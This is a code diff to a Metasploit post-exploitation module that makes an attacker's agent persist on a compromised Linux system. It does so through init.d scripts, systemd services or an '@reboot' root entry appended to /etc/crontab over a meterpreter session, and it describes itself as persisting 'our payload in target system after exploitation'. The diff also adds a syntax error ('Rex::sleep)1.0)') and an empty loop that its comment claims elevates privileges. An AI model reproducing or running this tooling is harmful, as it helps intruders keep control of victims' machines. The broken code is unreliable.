@@ -16,16 +16,16 @@
 # [ DESCRIPTION ]
 # Builds 'persistance' init.d startup script that allow users to persiste your agent
 # (executable) on Linux distros at every startup. This post-module requires the agent
-# allready deployed on target system and accepts any 'linux' chmoded agents (elf|sh|py|rb|pl)
-# to be auto-executed at startup. This module also accepts shebang agents (eg #!/usr/bin/python)
-# and allow users to use 'systemd' (advanced option) or 'crontab' as an alternative way to persiste.
+# allready deployed on target system and accepts any chmoded agents (elf|sh|py|rb|pl)
+# to be auto-executed. It also allow is users to use 'systemd' or 'crontab' as an
+# alternative way to persiste our payload in target system after exploitation.
 # HINT: In Kali distos we are 'root' by default, so this post module does
 # not require privilege escalation in systems were we are allready root ..
 #
 #
 # [ MODULE OPTIONS ]
 # The session number to run this module on        => set SESSION 3
-# The full remote path of binary to execute       => set REMOTE_PATH /root/agent.sh
+# The asoluct  path of binary to execute          => set REMOTE_PATH /root/agent.sh
 # Time to wait for the agent to start             => set START_TIME 15
 # Use 'init.d' to persiste our payload?           => set INITD true
 # Use 'systemd' to persiste our payload?          => set SYSTEMD true
@@ -100,9 +100,9 @@ class MetasploitModule < Msf::Post
 #
         def initialize(info={})
                 super(update_info(info,
-                        'Name'          => 'Linux Kali init.d persistence post-module',
+                        'Name'          => 'Linux persistence [post-exploit]',
                         'Description'   => %q{
-                                        Builds 'persistance' init.d startup script that allow users to persiste your agent (executable) on Linux distros at every startup. This post-module requires the agent allready deployed on target system and accepts any 'linux' chmoded agents (elf|sh|py|rb|pl) to be auto-executed at startup. This module also accepts shebang agents (eg #!/usr/bin/python) and allow users to use 'systemd' (advanced option) or 'crontab' as an alternative way to persiste.
+                                        Builds 'persistance' init.d startup script that allow users to persiste your agent (executable) on Linux distros at every startup. This post-module requires the agent allready deployed on target system and accepts any chmoded agents (elf|sh|py|rb|pl) to be auto-executed. It also allow is users to use 'systemd' or 'crontab' as an alternative way to persiste our payload in target system after exploitation.
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -179,8 +179,8 @@ def ls_stage1
 # ---------------------------------------------------
 if datastore['SYSTEMD'] == true
 # make sure all options needed by this fuction are set
-if datastore['REMOTE_PATH'] == 'nil' || datastore['RPATH_SYSTEMD'] == 'nil' || datastore['SESSION'] == 'nil'
-  print_error("[ERROR] set REMOTE_PATH | RPATH_SYSTEMD | SESSION options before continue.")
+if datastore['REMOTE_PATH'] == 'nil' || datastore['RPATH_SYSTEMD'] == 'nil'
+  print_error("[ERROR] set REMOTE_PATH | RPATH_SYSTEMD options before continue.")
   return nil
 end
 
@@ -213,6 +213,7 @@ Rex::sleep(1.0)
       return nil
     else
       print_status("Remote agent full path found.")
+      Rex::sleep(1.0)
     end
 
       #
@@ -270,8 +271,8 @@ end
 # ---------------------------------------------------
 if datastore['INITD'] == true
 # make sure all options needed by this fuction are set
-if datastore['REMOTE_PATH'] == 'nil' || datastore['INIT_PATH'] == 'nil' || datastore['SESSION'] == 'nil'
-  print_error("[ERROR] set REMOTE_PATH | INIT_PATH | SESSION options before continue.")
+if datastore['REMOTE_PATH'] == 'nil' || datastore['INIT_PATH'] == 'nil' || datastore['START_TIME'] == 'nil'
+  print_error("[ERROR] set REMOTE_PATH | INIT_PATH | START_TIME options before continue.")
   return nil
 end
 
@@ -304,6 +305,7 @@ Rex::sleep(1.0)
       return nil
     else
       print_status("Remote agent full path found.")
+      Rex::sleep(1.0)
     end
 
     #
@@ -311,6 +313,7 @@ Rex::sleep(1.0)
     #
     if datastore['SHEBANG'] == true
     print_warning("Agent with shebang sellected.")
+    Rex::sleep(1.0)
       #
       # If used agents with SHEBANG (eg #!/usr/bin/python)
       # TODO: Check Extensions execution using bash ( elf | sh | py | rb | pl ) 
@@ -396,12 +399,12 @@ end
 
 
 # ---------------------------------------------------
-# use crontab service ceation
+# use crontab service creation
 # ---------------------------------------------------
 if datastore['CRONTAB'] == true
 # make sure all options needed by this fuction are set
-if datastore['REMOTE_PATH'] == 'nil' || datastore['CRON_PATH'] == 'nil' || datastore['SESSION'] == 'nil'
-  print_error("[ERROR] set REMOTE_PATH | CRON_PATH | SESSION options before continue.")
+if datastore['REMOTE_PATH'] == 'nil' || datastore['CRON_PATH'] == 'nil'
+  print_error("[ERROR] set REMOTE_PATH | CRON_PATH options before continue.")
   return nil
 end
 
@@ -422,6 +425,7 @@ Rex::sleep(1.0)
     serv_file = datastore['CRON_PATH'] # /etc/crontab
     if session.fs.file.exist?(serv_file)
       print_status("path: #{serv_file} found.")
+      Rex::sleep)1.0)
     else
       print_error("path #{serv_file} not found.")
       return nil
@@ -435,6 +439,7 @@ Rex::sleep(1.0)
       return nil
     else
       print_status("Remote agent full path found.")
+      Rex::sleep(1.0)
     end
 
       #
@@ -442,7 +447,7 @@ Rex::sleep(1.0)
       #
       print_status("Writing crontab schedule task (@reboot).")
       Rex::sleep(1.0)
-      print_status("Executing: echo \"@reboot \\* \\* \\* \\* root #{remote_path}\" >> #{serv_file}")
+      print_status("Executing: echo \"@reboot \* \* \* \* root #{remote_path}\" >> #{serv_file}")
       cmd_exec("echo \"@reboot * * * * root #{remote_path}\" >> #{serv_file}")
       Rex::sleep(1.0)
       print_status("Reloading crontab daemon.")
@@ -477,7 +482,7 @@ def ls_stage2
 
   session = client
   sysnfo = session.sys.config.sysinfo
-  print_status("Deleting persistence schedules.")
+  print_status("Delete remote persistence schedules.")
   Rex::sleep(1.0)
 
 
@@ -510,6 +515,7 @@ end
       return nil
     else
       print_status("Persistence script full path found.")
+      Rex::sleep(1.0)
     end
 
       #
@@ -568,6 +574,7 @@ end
       return nil
     else
       print_status("Persistence script full path found.")
+      Rex::sleep(1.0)
     end
 
       #
@@ -602,8 +609,8 @@ end
 # ---------------------------------------------------
 if datastore['CRONTAB'] == true
 # make sure all options needed by this fuction are set
-if datastore['REMOTE_PATH'] == 'nil' || datastore['CRON_PATH'] == 'nil' || datastore['SESSION'] == 'nil'
-  print_error("[ERROR] set REMOTE_PATH | CRON_PATH | SESSION options before continue.")
+if datastore['REMOTE_PATH'] == 'nil' || datastore['CRON_PATH'] == 'nil'
+  print_error("[ERROR] set REMOTE_PATH | CRON_PATH options before continue.")
   return nil
 end
 
@@ -623,6 +630,7 @@ end
       return nil
     else
       print_status("crontab directory full path found.")
+      Rex::sleep(1.0)
     end
 
       #
@@ -712,10 +720,10 @@ def run
       directory = client.fs.dir.pwd
 
     # Print banner and scan results on screen
-    print_line("    +---------------------------------------------+")
-    print_line("    |  Kali Linux init.d persistence post-module  |")
-    print_line("    |            Author : r00t-3xp10it            |")
-    print_line("    +---------------------------------------------+")
+    print_line("    +-------------------------------------------+")
+    print_line("    |   Linux persistence [post-exploitation]   |")
+    print_line("    |           Author : r00t-3xp10it           |")
+    print_line("    +-------------------------------------------+")
     print_line("")
     print_line("    Running on session  : #{datastore['SESSION']}")
     print_line("    Target Architecture : #{sysnfo['Architecture']}")
@@ -728,9 +736,6 @@ def run
     print_line("")
 
 
-    #
-    # the 'def check()' funtion that rapid7 requires to accept new modules.
-    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
     #
     # check for proper operative system (Linux)
     #
@@ -755,24 +760,27 @@ def run
       print_error("[ABORT]: This module only works in meterpreter sessions!")
       return nil
     end
+    # elevate session privileges befor runing
+    client.sys.config.getprivs.each do |priv|
+    end
 
 
-#
+# --------------------------------------------
 # Selected settings to run
-#
-      if datastore['REMOTE_PATH'] && datastore['DEL_PERSISTENCE'] == false
-         # jump to persistence exploit function
-         ls_stage1
-      end
+# --------------------------------------------
 
-      if datastore['DEL_PERSISTENCE'] == true
-         # jump to delete persistence function
-         ls_stage2
-      end
+    if datastore['REMOTE_PATH'] && datastore['DEL_PERSISTENCE'] == false
+      # jump to persistence exploit function
+      ls_stage1
+    end
 
-      if datastore['SINGLE_COM']
-         ls_stage3
-      end
+    if datastore['DEL_PERSISTENCE'] == true
+      # jump to delete persistence function
+      ls_stage2
+    end
 
-   end
+    if datastore['SINGLE_COM']
+      ls_stage3
+    end
+  end
 end
